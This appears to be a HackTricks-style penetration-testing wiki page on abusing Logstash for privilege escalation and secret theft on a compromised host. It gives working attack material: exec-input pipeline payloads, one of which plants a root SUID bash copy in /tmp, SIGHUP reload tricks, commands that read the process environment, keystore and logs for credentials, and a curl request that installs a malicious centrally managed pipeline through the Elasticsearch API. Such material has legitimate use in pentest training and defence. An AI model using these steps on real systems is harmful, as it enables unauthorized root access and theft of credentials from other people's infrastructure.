# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash is used to **gather, transform, and dispatch logs** through a system known as **pipelines**. These pipelines are made up of **input**, **filter**, and **output** stages.<sup>[[4]](#references)</sup> An interesting aspect arises when Logstash operates on a compromised machine.

### Pipeline Configuration

On Debian and RPM package installs, pipelines are configured via **/etc/logstash/pipelines.yml**, which lists the locations of the pipeline configurations; other distributions place `pipelines.yml` in the Logstash `path.settings` directory.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

This file reveals where the **.conf** files containing pipeline configurations are located. When using an **Elasticsearch output**, inspect its `user`/`password`, `cloud_auth`, or `api_key` settings; the account's effective privileges depend on Elasticsearch. A `path.config` glob loads every matching file for that pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

If Logstash is started with `-f <directory>` instead of `pipelines.yml`, `-f` takes precedence and **all files inside that directory are concatenated in lexicographical order and parsed as a single config**.<sup>[[6]](#references)[[7]](#references)</sup> This creates 2 offensive implications:

- A dropped file like `000-input.conf` or `zzz-output.conf` can change how the final pipeline is assembled
- A malformed file can make the combined config fail validation; during reload, Logstash retains the previous pipeline, so validate payloads before relying on auto-reload.<sup>[[1]](#references)</sup>

### Fast Enumeration on a Compromised Host

On a box where Logstash is installed, quickly inspect:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Also check whether the local monitoring API is reachable. By default it binds on **127.0.0.1:9600**, which is usually enough after landing on the host.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

These endpoints expose pipeline IDs and settings, runtime metrics, and config-reload success/failure counters, helping confirm whether a change was accepted.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

If a recovered credential targets **Elasticsearch**, check [this other page about Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Privilege Escalation via Writable Pipelines

To attempt privilege escalation, first identify the user under which the Logstash service is actually running; do not assume it is root or the **logstash** user. Ensure you meet **one** of these criteria:

- Possess **write access** to a pipeline **.conf** file **or**
- The **/etc/logstash/pipelines.yml** file uses a wildcard, and you can write to the target folder.<sup>[[6]](#references)[[7]](#references)</sup>

Additionally, **one** of these conditions must be fulfilled:

- Capability to restart the Logstash service **or**
- The **/etc/logstash/logstash.yml** file has **config.reload.automatic: true** set.<sup>[[1]](#references)[[15]](#references)</sup>

Given a wildcard in the configuration, creating a file that matches this wildcard allows for command execution.<sup>[[7]](#references)[[9]](#references)</sup> For instance:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Here, **interval** determines the execution frequency in seconds. In the given example, the **whoami** command runs every 120 seconds, with its output directed to **/tmp/output.log**.<sup>[[9]](#references)</sup>

With **config.reload.automatic: true** in **/etc/logstash/logstash.yml**, Logstash will automatically detect and apply new or modified pipeline configurations without needing a restart.<sup>[[1]](#references)[[15]](#references)</sup> If there's no wildcard, modifications can still be made to existing configurations, but caution is advised to avoid disruptions.

### More Reliable Pipeline Payloads

The `exec` input plugin still works in current releases and requires either an `interval` or a `schedule`. It executes by **forking** the Logstash JVM, so if memory is tight your payload may fail with `ENOMEM` instead of silently running.<sup>[[9]](#references)</sup>

When the service has sufficient privileges to create a root-owned SUID file, a practical privilege-escalation payload is one that leaves a durable artifact:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

If you don't have restart rights but can signal the process, Logstash also supports a **SIGHUP**-triggered reload on Unix-like systems:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Be aware that not every plugin is reload-friendly. For example, the **stdin** input prevents automatic reload, so don't assume `config.reload.automatic` will always pick up your changes.<sup>[[1]](#references)</sup>

### Stealing Secrets from Logstash

Before focusing only on code execution, harvest the data Logstash already has access to:

- Credentials may appear in `elasticsearch {}` outputs, `http_poller` URLs/settings, JDBC inputs, or cloud-related settings; these plugins expose credential fields worth searching for.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Secure settings may live in **`/etc/logstash/logstash.keystore`** or another `path.settings` directory.<sup>[[5]](#references)[[10]](#references)</sup>
- The keystore password may be supplied through **`LOGSTASH_KEYSTORE_PASS`**, and RPM/DEB installs source service environment variables from **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Environment-variable expansion with `${VAR}` is resolved at Logstash startup, so the service environment is worth inspecting.<sup>[[14]](#references)</sup>

Useful checks:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

This is also worth checking because **CVE-2023-46672** showed that, under specific circumstances, Logstash recorded sensitive information in its logs, including secrets stored in its keystore and referenced from configuration; review old Logstash logs and `journald` entries if those circumstances may apply.<sup>[[3]](#references)</sup>

### Centralized Pipeline Management Abuse

In some environments, the host does **not** rely on local `.conf` files at all. If **`xpack.management.enabled: true`** is configured, Logstash can pull centrally managed pipelines from Elasticsearch/Kibana, and after enabling this mode local pipeline configs are no longer the source of truth.<sup>[[2]](#references)</sup>

That means a different attack path:

1. Recover Elastic credentials from local Logstash settings, the keystore, or logs.<sup>[[3]](#references)[[10]](#references)</sup>
2. Verify whether the account has the **`manage_logstash_pipelines`** cluster privilege.<sup>[[16]](#references)</sup>
3. Create or replace a centrally managed pipeline so the Logstash host executes your payload on its next poll interval.<sup>[[2]](#references)[[16]](#references)</sup>

The Elasticsearch API used for this feature is:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

This is especially useful when local files are read-only but Logstash is already registered to fetch pipelines remotely.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Creating a Logstash Pipeline](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Logstash Directory Layout](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Multiple Pipelines](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Running Logstash from the Command Line](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Monitoring Logstash with APIs](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Secrets keystore for secure settings](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch output plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc input plugin](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Using environment variables](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Create or update a Logstash pipeline](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Get settings for pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Get statistics for pipelines](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)

{{#include ../../banners/hacktricks-training.md}}
